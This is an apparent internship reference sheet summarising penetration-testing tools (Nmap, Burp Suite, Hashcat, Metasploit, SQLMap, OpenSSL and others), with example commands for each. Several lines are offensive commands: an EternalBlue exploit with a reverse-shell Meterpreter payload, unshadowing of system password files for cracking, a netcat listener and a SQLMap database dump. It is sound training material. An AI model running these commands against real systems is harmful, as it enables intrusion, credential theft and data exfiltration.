# Tools Used — Task 1

## Overview
This document lists all tools explored and used during Task 1 of the ApexPlanet Internship, covering Linux, Networking, Cryptography, and Web/Pentesting domains.

---

## 🔍 Network Scanning & Enumeration

### Nmap
- **Full Name**: Network Mapper
- **Category**: Port Scanner / Network Discovery
- **Description**: The go-to tool for network scanning. Discovers hosts, open ports, running services, OS versions, and can run scripts for vulnerability detection.

```bash
nmap 192.168.1.1                    # Basic scan
nmap -sV 192.168.1.1                # Service/version detection
nmap -sC 192.168.1.1                # Run default scripts
nmap -A 192.168.1.1                 # Aggressive scan (OS, version, scripts)
nmap -p 1-65535 192.168.1.1         # Scan all ports
nmap -sU 192.168.1.1                # UDP scan
nmap -sS 192.168.1.1                # SYN stealth scan
nmap -O 192.168.1.1                 # OS detection
nmap --script vuln 192.168.1.1      # Vulnerability scan
nmap -iL targets.txt                # Scan from file
```

**Common Nmap Output States:**
| State | Meaning |
|-------|---------|
| open | Port is accepting connections |
| closed | Port is accessible but no service |
| filtered | Firewall blocking the port |
| unfiltered | Accessible but state unknown |

---

## 🌐 Web Application Testing

### Burp Suite
- **Category**: Web Application Security / Proxy
- **Description**: The industry-standard tool for web app pentesting. Intercepts and modifies HTTP/HTTPS traffic between browser and server.

**Key Modules:**
| Module | Purpose |
|--------|---------|
| **Proxy** | Intercept and modify HTTP requests/responses |
| **Repeater** | Manually resend and modify requests |
| **Intruder** | Automated fuzzing and brute-force attacks |
| **Scanner** | Automated vulnerability scanning (Pro only) |
| **Decoder** | Encode/decode data (Base64, URL, HTML, etc.) |
| **Comparer** | Diff two pieces of data |
| **Sequencer** | Analyze randomness of tokens |
| **Extender** | Add plugins/extensions (BApp Store) |

**Common Workflow:**
1. Set browser proxy to `127.0.0.1:8080`
2. Intercept request in Proxy tab
3. Send to Repeater for manual testing
4. Send to Intruder for automated attacks

**Common Use Cases:**
- SQL Injection testing
- XSS (Cross-Site Scripting) detection
- Authentication bypass
- Session token analysis
- Directory traversal

---

## 📡 Packet Analysis

### Wireshark
- **Category**: Packet Capture / Network Analyzer
- **Description**: GUI-based packet analyzer. Captures and inspects network traffic in real time. Essential for understanding protocols and detecting anomalies.

**Key Features:**
- Live packet capture on any network interface
- Deep protocol inspection (HTTP, DNS, TCP, TLS, etc.)
- Display filters to isolate specific traffic
- Follow TCP/UDP streams
- Export captured data

**Common Display Filters:**
```
ip.addr == 192.168.1.1          # Filter by IP
tcp.port == 80                  # Filter by port
http                            # Show only HTTP traffic
dns                             # Show only DNS traffic
tcp.flags.syn == 1              # Show SYN packets
http.request.method == "POST"   # Show POST requests
!(arp or dns or icmp)           # Exclude noise
```

**CLI Alternative — tcpdump:**
```bash
tcpdump -i eth0                         # Capture on interface
tcpdump -i eth0 port 80                 # Capture HTTP
tcpdump -i eth0 -w capture.pcap         # Save to file
tcpdump -r capture.pcap                 # Read from file
```

---

## 🔐 Password Cracking

### Hashcat
- **Category**: Password Cracking
- **Description**: GPU-accelerated password hash cracker. Supports 300+ hash types.

```bash
hashcat -m 0 hash.txt wordlist.txt          # MD5
hashcat -m 1000 hash.txt wordlist.txt       # NTLM (Windows)
hashcat -m 1800 hash.txt wordlist.txt       # SHA-512 (Linux)
hashcat -m 3200 hash.txt wordlist.txt       # bcrypt
hashcat -a 3 hash.txt ?a?a?a?a?a?a         # Brute-force (6 chars)
hashcat -a 0 -r rules/best64.rule hash.txt wordlist.txt  # With rules
```

**Attack Modes:**
| Mode | Flag | Description |
|------|------|-------------|
| Dictionary | `-a 0` | Wordlist attack |
| Combinator | `-a 1` | Combine two wordlists |
| Brute-force | `-a 3` | Try all combinations |
| Hybrid | `-a 6/7` | Wordlist + mask |

### John the Ripper
- **Category**: Password Cracking
- **Description**: Classic CPU-based password cracker. Great for cracking various hash formats and shadow files.

```bash
john hash.txt                               # Auto-detect and crack
john --wordlist=rockyou.txt hash.txt        # Dictionary attack
john --format=md5 hash.txt                  # Specify hash type
john --show hash.txt                        # Show cracked passwords
unshadow /etc/passwd /etc/shadow > hashes   # Prepare Linux hashes
```

---

## 🕵️ Reconnaissance & OSINT

### theHarvester
- **Category**: OSINT / Recon
- **Description**: Gathers emails, subdomains, IPs, and URLs from public sources.

```bash
theHarvester -d example.com -b google      # Google search
theHarvester -d example.com -b all         # All sources
```

### Maltego
- **Category**: OSINT / Visual Link Analysis
- **Description**: GUI tool for mapping relationships between people, domains, IPs, and organizations.

### Recon-ng
- **Category**: OSINT Framework
- **Description**: Modular web reconnaissance framework similar to Metasploit.

```bash
recon-ng
marketplace install all
modules load recon/domains-hosts/hackertarget
options set SOURCE example.com
run
```

### Shodan
- **Website**: shodan.io
- **Category**: OSINT / IoT Search Engine
- **Description**: Search engine for internet-connected devices. Finds exposed servers, cameras, routers, and more.

```bash
shodan search "apache 2.4"
shodan host 8.8.8.8
```

---

## 💥 Exploitation Frameworks

### Metasploit Framework
- **Category**: Exploitation / Pentesting Framework
- **Description**: The most widely used exploitation framework. Contains hundreds of exploits, payloads, and auxiliary modules.

```bash
msfconsole                          # Start Metasploit
search eternalblue                  # Search for exploit
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 192.168.1.10
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST 192.168.1.5
run                                 # Launch exploit
```

**Key Concepts:**
| Term | Meaning |
|------|---------|
| Exploit | Code that takes advantage of a vulnerability |
| Payload | Code that runs after exploitation (e.g., shell) |
| Meterpreter | Advanced in-memory payload |
| Auxiliary | Scanners, fuzzers, sniffers |
| Post | Post-exploitation modules |

---

## 🌐 Web Enumeration

### Gobuster / Dirb
- **Category**: Directory/File Brute-forcing
- **Description**: Brute-forces hidden directories and files on web servers.

```bash
gobuster dir -u http://target.com -w /usr/share/wordlists/dirb/common.txt
gobuster dns -d target.com -w subdomains.txt    # Subdomain enumeration
dirb http://target.com                          # Basic dirb scan
```

### Nikto
- **Category**: Web Vulnerability Scanner
- **Description**: Scans web servers for dangerous files, outdated software, and misconfigurations.

```bash
nikto -h http://target.com
nikto -h http://target.com -p 8080
```

### SQLMap
- **Category**: SQL Injection
- **Description**: Automated SQL injection detection and exploitation tool.

```bash
sqlmap -u "http://target.com/page?id=1"             # Basic scan
sqlmap -u "http://target.com/page?id=1" --dbs        # List databases
sqlmap -u "http://target.com/page?id=1" -D db --tables  # List tables
sqlmap -u "http://target.com/page?id=1" --dump       # Dump data
```

---

## 🔑 Cryptography Tools

### OpenSSL
- **Category**: Cryptography / Certificates
- **Description**: Full-featured toolkit for SSL/TLS and general cryptography.

```bash
openssl genrsa -out private.pem 2048                    # Generate RSA key
openssl rsa -in private.pem -pubout -out public.pem     # Extract public key
openssl req -new -x509 -key private.pem -out cert.pem   # Self-signed cert
openssl enc -aes-256-cbc -in file.txt -out file.enc     # Encrypt file
openssl enc -d -aes-256-cbc -in file.enc -out file.txt  # Decrypt file
openssl dgst -sha256 file.txt                           # SHA-256 hash
openssl s_client -connect google.com:443                # Inspect TLS cert
```

### GPG (GNU Privacy Guard)
- **Category**: Encryption / Signing
- **Description**: PGP-compatible encryption for files and emails.

```bash
gpg --gen-key                                   # Generate key pair
gpg --list-keys                                 # List keys
gpg --encrypt --recipient user@email file.txt   # Encrypt
gpg --decrypt file.txt.gpg                      # Decrypt
gpg --sign file.txt                             # Sign file
gpg --verify file.txt.sig                       # Verify signature
```

### CyberChef
- **Website**: gchq.github.io/CyberChef
- **Category**: Multi-purpose Encoding/Crypto
- **Description**: Browser-based "Swiss Army knife" for encoding, decoding, encryption, hashing, and data analysis. No installation needed.

---

## 🖥️ Linux Tools

| Tool | Description | Usage |
|------|-------------|-------|
| `netcat (nc)` | TCP/UDP Swiss Army knife | `nc -lvp 4444` |
| `curl` | HTTP requests from CLI | `curl -X POST url -d "data"` |
| `wget` | Download files | `wget https://url/file` |
| `ssh` | Secure remote shell | `ssh user@host` |
| `scp` | Secure file copy | `scp file user@host:/path` |
| `grep` | Search text patterns | `grep -r "pattern" /dir` |
| `find` | Find files | `find / -perm -4000` (SUID files) |
| `awk` | Text processing | `awk -F: '{print $1}' /etc/passwd` |
| `sed` | Stream editor | `sed 's/old/new/g' file` |
| `base64` | Encode/decode | `echo "text" \| base64` |
| `xxd` | Hex dump | `xxd file.bin` |
| `strings` | Extract strings from binary | `strings binary_file` |
| `file` | Identify file type | `file unknown_file` |
| `binwalk` | Firmware/binary analysis | `binwalk firmware.bin` |
| `strace` | Trace system calls | `strace ./program` |

---

## 🧪 Lab & Virtualization

| Tool | Purpose |
|------|---------|
| **VirtualBox** | Free VM hypervisor |
| **VMware Workstation** | Professional VM hypervisor |
| **Kali Linux** | Pentesting distro (all tools pre-installed) |
| **Parrot OS** | Lightweight pentesting distro |
| **TryHackMe** | Guided labs — tryhackme.com |
| **HackTheBox** | CTF-style machines — hackthebox.com |

---

## 📋 Quick Reference — Tool by Task

| Task | Tool |
|------|------|
| Port scanning | Nmap |
| Web app testing | Burp Suite |
| Packet capture | Wireshark, tcpdump |
| Password cracking | Hashcat, John the Ripper |
| Exploitation | Metasploit |
| Directory brute-force | Gobuster, Dirb |
| Web vuln scanning | Nikto |
| SQL injection | SQLMap |
| OSINT / Recon | theHarvester, Maltego, Shodan |
| Encryption / Certs | OpenSSL, GPG |
| Encoding / Decoding | CyberChef, base64, xxd |
| Network analysis | Wireshark, netstat, ss |
